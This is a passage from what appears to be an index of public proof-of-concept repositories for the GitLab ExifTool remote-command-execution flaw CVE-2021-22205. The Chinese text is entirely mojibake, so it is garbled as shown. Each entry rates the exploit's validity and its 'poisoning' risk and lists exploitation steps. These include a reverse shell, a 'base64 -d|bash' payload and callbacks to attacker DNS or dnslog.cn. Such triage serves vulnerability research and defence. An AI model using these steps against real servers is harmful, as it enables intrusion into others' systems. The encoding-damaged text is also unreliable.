4.  GitLab æœåŠ¡å™¨ä½¿ç”¨ ExifTool å¤„ç†è¯¥å›¾åƒæ—¶ï¼Œç”±äºŽ ExifTool å­˜åœ¨ CVE-2021-22204 æ¼æ´žï¼Œä¼šå¯¼è‡´æ‰§è¡Œæ”»å‡»è€…é¢„è®¾çš„å‘½ä»¤ã€‚
5.  å‘½ä»¤æ‰§è¡Œçš„ç»“æžœå¯ä»¥é€šè¿‡ DNS æŸ¥è¯¢æˆ–è€…å…¶ä»–æ–¹å¼è¿”å›žç»™æ”»å‡»è€…ã€‚

ç®€è€Œè¨€ä¹‹ï¼Œåˆ©ç”¨æ–¹å¼æ˜¯ï¼š**ä¸Šä¼ æ¶æ„æž„é€ çš„DJVUæ–‡ä»¶ -> è§¦å‘ExifToolè§£æž -> ExifToolå‘½ä»¤æ³¨å…¥ -> æ‰§è¡Œä»»æ„ä»£ç **

**é¡¹ç›®åœ°å€:** [runsel/GitLab-CVE-2021-22205-](https://github.com/runsel/GitLab-CVE-2021-22205-)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #23

**æ¥æº**: [CVE-2021-22205-shang159_CVE-2021-22205-getshell.md](../2021/CVE-2021-22205-shang159_CVE-2021-22205-getshell.md)

## CVE-2021-22205-GitLab-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…ï¼Œä¸”æ”»å‡»è€…å¯ä»¥ä¸Šä¼ æ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

è¯¥æ¼æ´žæ˜¯ç”±äºŽGitLabå¯¹ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶è§£æžä¸å½“ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æ”»å‡»è€…å¯ä»¥æž„é€ åŒ…å«æ¶æ„ä»£ç çš„å›¾ç‰‡ï¼ˆä¾‹å¦‚DJVUæ ¼å¼ï¼‰å¹¶ä¸Šä¼ åˆ°GitLabï¼Œå½“GitLabä½¿ç”¨ExifToolç­‰å·¥å…·è§£æžå›¾ç‰‡æ—¶ï¼Œæ¶æ„ä»£ç ä¼šè¢«æ‰§è¡Œã€‚æ ¹æ®æä¾›çš„æ¼æ´žåˆ©ç”¨ä»£ç ï¼Œåˆ©ç”¨æ–¹å¼å¦‚ä¸‹ï¼š

1.  **æž„é€ Payloadï¼š**  ä½¿ç”¨Pythonè„šæœ¬ç”ŸæˆåŒ…å«åå¼¹shellå‘½ä»¤çš„DJVUå›¾ç‰‡ã€‚è„šæœ¬é€šè¿‡ä¿®æ”¹å›¾ç‰‡çš„å…ƒæ•°æ®ï¼ˆCopyrightå­—æ®µï¼‰åµŒå…¥å‘½ä»¤ã€‚PayloadåŒ…å«æ‰§è¡Œshellå‘½ä»¤çš„ä»£ç ï¼Œä¾‹å¦‚åå¼¹shellåˆ°æ”»å‡»è€…æŽ§åˆ¶çš„IPåœ°å€å’Œç«¯å£ã€‚
2.  **ä¸Šä¼ å›¾ç‰‡ï¼š** å°†ç”Ÿæˆçš„å›¾ç‰‡ä¸Šä¼ åˆ°GitLabã€‚æ ¹æ®POCæè¿°ï¼Œä¸åŒç‰ˆæœ¬çš„GitLabä¸Šä¼ ç‚¹å¯èƒ½ä¸åŒï¼Œéœ€è¦å°è¯•ä¸åŒçš„ä¸Šä¼ è·¯å¾„ï¼ˆä¾‹å¦‚issueé¡µé¢ï¼‰ã€‚
3.  **è§¦å‘æ¼æ´žï¼š** GitLabåŽç«¯ä½¿ç”¨ExifToolå¤„ç†ä¸Šä¼ çš„å›¾ç‰‡æ—¶ï¼Œä¼šè§£æžå›¾ç‰‡å…ƒæ•°æ®ï¼Œä»Žè€Œæ‰§è¡ŒåµŒå…¥çš„æ¶æ„å‘½ä»¤ã€‚
4.  **èŽ·å–Shellï¼š** æ”»å‡»è€…åœ¨æœ¬åœ°ç›‘å¬æŒ‡å®šç«¯å£ï¼Œç­‰å¾…ç›®æ ‡æœºå™¨åå¼¹shellè¿žæŽ¥ï¼Œä»Žè€ŒèŽ·å–å¯¹æœåŠ¡å™¨çš„æŽ§åˆ¶æƒã€‚

**æœ‰æ•ˆæ€§ï¼š** æ ¹æ®æä¾›çš„POCä»£ç å’Œæ¼æ´žæè¿°ï¼Œè¯¥POCåº”è¯¥æ˜¯æœ‰æ•ˆçš„ï¼Œå¯ä»¥ç”¨äºŽåœ¨å—å½±å“çš„GitLabç‰ˆæœ¬ä¸Šå®žçŽ°è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚

**æŠ•æ¯’é£Žé™©ï¼š** åˆ†æžæä¾›çš„POCä»£ç ï¼Œæ²¡æœ‰å‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’ä»£ç ã€‚è¯¥ä»£ç ä¸»è¦åŠŸèƒ½æ˜¯ç”ŸæˆåŒ…å«æ¶æ„å‘½ä»¤çš„å›¾ç‰‡æ–‡ä»¶ï¼Œä»¥åŠä¸€äº›è¾…åŠ©è„šæœ¬ã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£Žé™©è¾ƒä½Žï¼Œä¸º0%ã€‚

**é¡¹ç›®åœ°å€:** [shang159/CVE-2021-22205-getshell](https://github.com/shang159/CVE-2021-22205-getshell)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #24

**æ¥æº**: [CVE-2021-22205-w0x68y_Gitlab-CVE-2021-22205.md](../2021/CVE-2021-22205-w0x68y_Gitlab-CVE-2021-22205.md)

## CVE-2021-22205 - GitLab ExifTool è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹å¯ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205 æ¼æ´žå­˜åœ¨äºŽ GitLab CE/EE ç‰ˆæœ¬ä¸­ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…æ‰§è¡Œè¿œç¨‹å‘½ä»¤ã€‚è¯¥æ¼æ´žçš„æ ¹æœ¬åŽŸå› æ˜¯ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™ ExifTool æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„æ¶æ„å›¾åƒæ–‡ä»¶ï¼Œåˆ©ç”¨ ExifTool çš„å‘½ä»¤æ³¨å…¥æ¼æ´žæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§ï¼š** æä¾›çš„ Python è„šæœ¬ `CVE-2021-22205-check.py` æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„ PoC è„šæœ¬ï¼Œç”¨äºŽæ£€æµ‹å’Œåˆ©ç”¨è¯¥æ¼æ´žã€‚å®ƒé€šè¿‡ä¸Šä¼ ä¸€ä¸ªåŒ…å«æ¶æ„ Exif å…ƒæ•°æ®çš„ç‰¹åˆ¶å›¾åƒæ–‡ä»¶æ¥å®žçŽ°è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚è¯¥è„šæœ¬ä¼šå°è¯•èŽ·å– CSRF tokenï¼Œç„¶åŽä¸Šä¼ åŒ…å«æ¶æ„å‘½ä»¤çš„å›¾åƒã€‚

**æŠ•æ¯’é£Žé™©ï¼š** ç»è¿‡åˆ†æžï¼Œæä¾›çš„ä»£ç ä»“åº“ä¸­æœªå‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’ä»£ç ã€‚è„šæœ¬çš„åŠŸèƒ½æ˜Žç¡®ï¼Œä¸”æ²¡æœ‰å‘çŽ°éšè—çš„æ¶æ„è¡Œä¸ºã€‚PoCè„šæœ¬ä¸­æ‰§è¡Œçš„å‘½ä»¤ï¼Œç”±ä½¿ç”¨è€…`-c`å‚æ•°æŒ‡å®šï¼Œå±žäºŽæ­£å¸¸çš„åŠŸèƒ½éªŒè¯ï¼Œè€ŒéžæŠ•æ¯’ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **æ¼æ´žè§¦å‘ï¼š** æ”»å‡»è€…éœ€è¦å‘å­˜åœ¨æ¼æ´žçš„ GitLab å®žä¾‹ä¸Šä¼ åŒ…å«æ¶æ„ Exif å…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶ã€‚
2.  **å‘½ä»¤æ³¨å…¥ï¼š** æ¶æ„å…ƒæ•°æ®è¢« ExifTool å¤„ç†æ—¶ï¼Œä¼šå¯¼è‡´å‘½ä»¤æ³¨å…¥ï¼Œä»Žè€Œæ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„å‘½ä»¤ã€‚
3.  **æœªæŽˆæƒè®¿é—®ï¼š** æ­¤æ¼æ´žæ— éœ€èº«ä»½éªŒè¯å³å¯åˆ©ç”¨ï¼Œå¤§å¤§é™ä½Žäº†æ”»å‡»é—¨æ§›ã€‚
4.  **RCEï¼š** æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´žåŽï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ GitLab æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œä»Žè€ŒæŽ§åˆ¶æœåŠ¡å™¨ã€‚

**é¡¹ç›®åœ°å€:** [w0x68y/Gitlab-CVE-2021-22205](https://github.com/w0x68y/Gitlab-CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---



---

## POC #11

**æ¥æº**: [CVE-2021-22205-findneo_GitLab-preauth-RCE_CVE-2021-22205.md](../2021/CVE-2021-22205-findneo_GitLab-preauth-RCE_CVE-2021-22205.md)

## CVE-2021-22205 - GitLab ExifTool å‘½ä»¤æ³¨å…¥

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** å‘½ä»¤æ³¨å…¥

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8 || >=13.9, <13.9.6 || >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹éœ€è¦å­˜åœ¨æ¼æ´žç‰ˆæœ¬ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡ç½‘ç»œè®¿é—®ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205æ˜¯ä¸€ä¸ªGitLab CE/EEä¸­çš„å‘½ä»¤æ³¨å…¥æ¼æ´žï¼Œå­˜åœ¨äºŽ11.9åˆ°13.10.3ä¹‹é—´çš„å¤šä¸ªç‰ˆæœ¬ä¸­ã€‚æ¼æ´žåŽŸå› æ˜¯GitLabåœ¨å¤„ç†å›¾åƒæ–‡ä»¶æ—¶ï¼Œæœªæ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„è¾“å…¥ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥åˆ©ç”¨ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æ¼æ´žåˆ©ç”¨æ–¹å¼ï¼š**

1.  æ”»å‡»è€…æž„é€ ä¸€ä¸ªæ¶æ„çš„å›¾åƒæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åŒ…å«åµŒå…¥çš„æ¶æ„å‘½ä»¤ã€‚POCä»£ç ä¸­ï¼Œä½¿ç”¨äº†`xxd`å‘½ä»¤å°†åå…­è¿›åˆ¶æ•°æ®è½¬æ¢æˆäºŒè¿›åˆ¶æ•°æ®ï¼Œå¹¶è¿½åŠ åˆ°åä¸º`1.jpg`çš„æ–‡ä»¶ä¸­ã€‚å…¶ä¸­ï¼Œè¿½åŠ çš„åå…­è¿›åˆ¶æ•°æ®ä¸­åŒ…å«äº†shellå‘½ä»¤ï¼Œæœ€ç»ˆå°†`xxx_base64_of_reverse_shell_code_xxx`è¿›è¡Œbase64è§£ç åŽæ‰§è¡Œã€‚
2.  æ”»å‡»è€…é€šè¿‡`curl`å‘½ä»¤ï¼Œæ¨¡æ‹Ÿæ–‡ä»¶ä¸Šä¼ è¯·æ±‚ï¼Œå°†æ¶æ„å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ°å­˜åœ¨æ¼æ´žçš„GitLabå®žä¾‹ã€‚POCä»£ç é€šè¿‡èŽ·å–ç”¨æˆ·çš„CSRF-Tokenï¼Œç„¶åŽåˆ©ç”¨/uploads/useræŽ¥å£ä¸Šä¼ ã€‚
3.  GitLabä½¿ç”¨ExifToolå¤„ç†ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶æ—¶ï¼Œç”±äºŽå›¾åƒæ–‡ä»¶ä¸­çš„æ¶æ„å‘½ä»¤ï¼Œå¯¼è‡´ExifToolæ‰§è¡Œè¯¥å‘½ä»¤ï¼Œä»Žè€Œå®žçŽ°è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚
4.  POCä¸­ä½¿ç”¨äº†`base64 -d|bash` çš„æ–¹å¼æ‰§è¡Œpayloadã€‚

**æŠ•æ¯’é£Žé™©åˆ†æžï¼š**

æä¾›çš„POCä»£ç ç›®çš„æ˜¯åˆ©ç”¨è¯¥æ¼æ´žå®žçŽ°è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œè™½ç„¶æ‰§è¡Œäº†å¤–éƒ¨å‘½ä»¤ï¼Œä½†æ˜¯æ²¡æœ‰å‘çŽ°ä½œè€…åœ¨å…¶ä¸­éšè—å…¶ä»–æ¶æ„ä»£ç çš„è¡Œä¸ºã€‚ä»£ç æ¸…æ™°åœ°å±•ç¤ºäº†æ¼æ´žåˆ©ç”¨çš„è¿‡ç¨‹ï¼Œæ²¡æœ‰å‘çŽ°è¯•å›¾åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šå®‰è£…åŽé—¨æˆ–è¿›è¡Œå…¶ä»–æ¶æ„æ“ä½œçš„è¿¹è±¡ã€‚è¯¥POCçš„ä¸»è¦ç›®çš„æ˜¯æ¼”ç¤ºæ¼æ´žåˆ©ç”¨ï¼Œè€Œéžè¿›è¡Œå®žé™…çš„æ¶æ„æ”»å‡»ã€‚

å› æ­¤ï¼ŒæŠ•æ¯’é£Žé™©è¯„ä¼°ä¸º 0%ã€‚

**é¡¹ç›®åœ°å€:** [findneo/GitLab-preauth-RCE_CVE-2021-22205](https://github.com/findneo/GitLab-preauth-RCE_CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #12

**æ¥æº**: [CVE-2021-22205-hh-hunter_cve-2021-22205.md](../2021/CVE-2021-22205-hh-hunter_cve-2021-22205.md)

## CVE-2021-22205-GitLab-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç½‘ç»œè®¿é—®GitLabå®žä¾‹ï¼Œç›®æ ‡å®žä¾‹ä½¿ç”¨å—å½±å“çš„ç‰ˆæœ¬ï¼Œå¹¶ä¸”å¯ä¸Šä¼ å›¾ç‰‡ï¼ˆæˆ–å…¶ä»–åˆ©ç”¨ExifToolè§£æžçš„æ–‡ä»¶ç±»åž‹ï¼‰ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205æ˜¯GitLab CE/EEä¸­çš„ä¸€ä¸ªè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæºäºŽGitLabå¯¹ä¸Šä¼ çš„å›¾ç‰‡æ–‡ä»¶ï¼ˆæˆ–å…¶ä»–åˆ©ç”¨ExifToolè§£æžçš„æ–‡ä»¶ç±»åž‹ï¼‰çš„æ ¡éªŒä¸ä¸¥æ ¼ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡æž„é€ æ¶æ„çš„å›¾ç‰‡æ–‡ä»¶ï¼Œåˆ©ç”¨ExifToolæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„docker-composeæ–‡ä»¶ä¸»è¦ç”¨äºŽæ­å»ºå­˜åœ¨æ¼æ´žå’Œä¸å­˜åœ¨æ¼æ´žçš„çŽ¯å¢ƒï¼Œç”¨äºŽéªŒè¯æ¼æ´žçš„ä¿®å¤æ•ˆæžœã€‚docker-compose-vulnerability.yml ä½¿ç”¨äº†13.9.5-ee.0ç‰ˆæœ¬ï¼Œåœ¨å—å½±å“çš„ç‰ˆæœ¬èŒƒå›´å†…ï¼Œå¯ä»¥éªŒè¯æ¼æ´žã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
æä¾›çš„docker-composeæ–‡ä»¶ä»…ä»…ç”¨äºŽæž„å»ºçŽ¯å¢ƒï¼Œæ²¡æœ‰å‘çŽ°æ¶æ„ä»£ç ï¼ŒæŠ•æ¯’é£Žé™©ä¸º0%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
æ”»å‡»è€…é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„æ¶æ„å›¾ç‰‡æ–‡ä»¶ï¼ˆä¾‹å¦‚ï¼ŒåŒ…å«æ¶æ„å‘½ä»¤çš„Exifå…ƒæ•°æ®çš„å›¾ç‰‡æ–‡ä»¶ï¼‰åˆ°GitLabæœåŠ¡å™¨ã€‚GitLabä½¿ç”¨ExifToolè§£æžè¯¥å›¾ç‰‡æ–‡ä»¶æ—¶ï¼Œä¼šæ‰§è¡Œå›¾ç‰‡ä¸­åµŒå…¥çš„æ¶æ„å‘½ä»¤ï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚å…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼š

1.  æž„é€ åŒ…å«æ¶æ„å‘½ä»¤çš„å›¾ç‰‡æ–‡ä»¶ã€‚
2.  å°†è¯¥å›¾ç‰‡æ–‡ä»¶ä¸Šä¼ åˆ°GitLabæœåŠ¡å™¨ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥é€šè¿‡å¤´åƒä¸Šä¼ ã€é¡¹ç›®logoä¸Šä¼ ç­‰åŠŸèƒ½ã€‚
3.  GitLabæœåŠ¡å™¨è°ƒç”¨ExifToolè§£æžè¯¥å›¾ç‰‡æ–‡ä»¶ï¼Œæ‰§è¡ŒåµŒå…¥çš„æ¶æ„å‘½ä»¤ã€‚
4.  æ”»å‡»è€…é€šè¿‡æ‰§è¡Œçš„å‘½ä»¤æŽ§åˆ¶æœåŠ¡å™¨ã€‚

**é¡¹ç›®åœ°å€:** [hh-hunter/cve-2021-22205](https://github.com/hh-hunter/cve-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #13

**æ¥æº**: [CVE-2021-22205-hhhotdrink_CVE-2021-22205.md](../2021/CVE-2021-22205-hhhotdrink_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹éœ€è¦ä½äºŽå—å½±å“çš„ç‰ˆæœ¬èŒƒå›´å†…ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡ç½‘ç»œè®¿é—®ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 10%

## è¯¦æƒ…

CVE-2021-22205 æ˜¯ä¸€ä¸ªå­˜åœ¨äºŽ GitLab CE/EE ä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæºäºŽ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼ˆåˆ©ç”¨ ExifTool çš„å‘½ä»¤æ³¨å…¥æ¼æ´žï¼‰æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æ ¹æ®æ¼æ´žåº“ä¿¡æ¯å’Œæä¾›çš„æ¼æ´žåˆ©ç”¨ä»£ç ï¼Œè¯¥æ¼æ´žæ˜¯æœ‰æ•ˆçš„ï¼Œå¹¶ä¸”å·²è¢«å…¬å¼€åˆ©ç”¨ã€‚CISA å·²å°†å…¶æ·»åŠ åˆ°å·²çŸ¥è¢«åˆ©ç”¨çš„æ¼æ´žç›®å½•ä¸­ã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
æä¾›çš„ Python è„šæœ¬ `22205exp.py` åŒ…å«æ¼æ´žéªŒè¯å’Œåˆ©ç”¨ä»£ç ã€‚ è¯¥è„šæœ¬åˆ©ç”¨ `dnslog.cn` æ¥éªŒè¯å‘½ä»¤æ‰§è¡Œã€‚ è™½ç„¶ `dnslog.cn` æ˜¯ä¸€ç§å¸¸è§çš„æ¼æ´žéªŒè¯æ–¹æ³•ï¼Œä½†å¦‚æžœæ”»å‡»è€…æŽ§åˆ¶ `dnslog.cn`ï¼Œåˆ™å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£Žé™©ï¼Œä»–ä»¬å¯ä»¥è®°å½•æ¼æ´žåˆ©ç”¨ä¿¡æ¯ã€‚ åŒæ—¶ï¼Œè„šæœ¬ä¸­ä½¿ç”¨äº†ç¡¬ç¼–ç çš„User-Agentå’ŒContent-Typeï¼Œè¿™å¢žåŠ äº†è„šæœ¬è¢«è¯†åˆ«å’Œé˜²å¾¡çš„å¯èƒ½æ€§ã€‚å¦‚æžœæ”»å‡»è€…ä¿®æ”¹è¿™äº›å‚æ•°ï¼Œå¯èƒ½ä¼šå¢žåŠ æ”»å‡»çš„æˆåŠŸçŽ‡ï¼Œä½†ä¹Ÿå¯èƒ½è¢«è§†ä¸ºæ½œåœ¨çš„æ¶æ„è¡Œä¸ºã€‚ æ­¤å¤–ï¼Œè¯¥è„šæœ¬ä¾èµ–äºŽ `beautifulsoup4` å’Œ `requests` åº“ã€‚ å¦‚æžœè¿™äº›åº“è¢«æ¶æ„ç¯¡æ”¹ï¼Œå¯èƒ½ä¼šå¯¼è‡´æŠ•æ¯’ã€‚ ç»¼åˆæ¥çœ‹ï¼Œè„šæœ¬æœ¬èº«åŒ…å«ç›´æŽ¥çš„åŽé—¨ä»£ç çš„å¯èƒ½æ€§è¾ƒä½Žï¼Œä½†é—´æŽ¥æŠ•æ¯’é£Žé™©ï¼ˆå¦‚ä¾èµ–åº“æˆ–éªŒè¯å¹³å°è¢«æŽ§åˆ¶ï¼‰ä»ç„¶å­˜åœ¨ï¼Œå› æ­¤æŠ•æ¯’é£Žé™©å¤§çº¦ä¸º10%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  **èŽ·å– CSRF Tokenï¼š** è„šæœ¬é¦–å…ˆè®¿é—® `/users/sign_in` é¡µé¢ï¼Œä½¿ç”¨ `BeautifulSoup` è§£æž HTMLï¼Œæå– CSRF tokenã€‚
2.  **æž„é€ æ¶æ„å›¾åƒæ–‡ä»¶ï¼š** è„šæœ¬æž„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ ExifTool å‘½ä»¤çš„ DJVU æ ¼å¼å›¾åƒæ–‡ä»¶ã€‚è¯¥å‘½ä»¤é€šå¸¸ç”¨äºŽæ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ï¼Œä¾‹å¦‚é€šè¿‡ `curl` å°†æœåŠ¡å™¨ä¿¡æ¯å‘é€åˆ°æ”»å‡»è€…çš„ DNS æœåŠ¡å™¨ã€‚
3.  **ä¸Šä¼ æ¶æ„å›¾åƒæ–‡ä»¶ï¼š** è„šæœ¬ä½¿ç”¨åŒ…å«æ¶æ„å›¾åƒæ–‡ä»¶å’Œ CSRF token çš„ `multipart/form-data` è¯·æ±‚ï¼Œå°†æ–‡ä»¶ä¸Šä¼ åˆ° `/uploads/user` ç«¯ç‚¹ã€‚
4.  **è§¦å‘å‘½ä»¤æ‰§è¡Œï¼š** GitLab å°è¯•ä½¿ç”¨ ExifTool å¤„ç†è¯¥å›¾åƒï¼Œç”±äºŽæ–‡ä»¶å†…å®¹æ²¡æœ‰ç»è¿‡å……åˆ†éªŒè¯ï¼Œå¯¼è‡´ ExifTool æ‰§è¡ŒåµŒå…¥åœ¨å›¾åƒæ–‡ä»¶ä¸­çš„æ¶æ„å‘½ä»¤ã€‚
5.  **éªŒè¯æ¼æ´žï¼š** è„šæœ¬é€šè¿‡æŸ¥è¯¢ `dnslog.cn` æ¥ç¡®è®¤å‘½ä»¤æ˜¯å¦æˆåŠŸæ‰§è¡Œã€‚

æ€»çš„æ¥è¯´ï¼Œè¯¥æ¼æ´žåˆ©ç”¨çš„æœ‰æ•ˆæ€§è¾ƒé«˜ï¼Œä½†éœ€è¦æ³¨æ„æ½œåœ¨çš„æŠ•æ¯’é£Žé™©ã€‚åˆ©ç”¨æ–¹å¼ç›¸å¯¹ç®€å•ï¼Œå¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶æ¥å®žçŽ°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [hhhotdrink/CVE-2021-22205](https://github.com/hhhotdrink/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #14

**æ¥æº**: [CVE-2021-22205-honypot_CVE-2021-22205.md](../2021/CVE-2021-22205-honypot_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å¯¼è‡´å®Œå…¨æŽ§åˆ¶å—å½±å“çš„GitLabå®žä¾‹

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** æœªç»èº«ä»½éªŒè¯çš„ç½‘ç»œè®¿é—®ï¼Œä»¥åŠç›®æ ‡GitLabå®žä¾‹å­˜åœ¨æ¼æ´žã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 20%

## è¯¦æƒ…

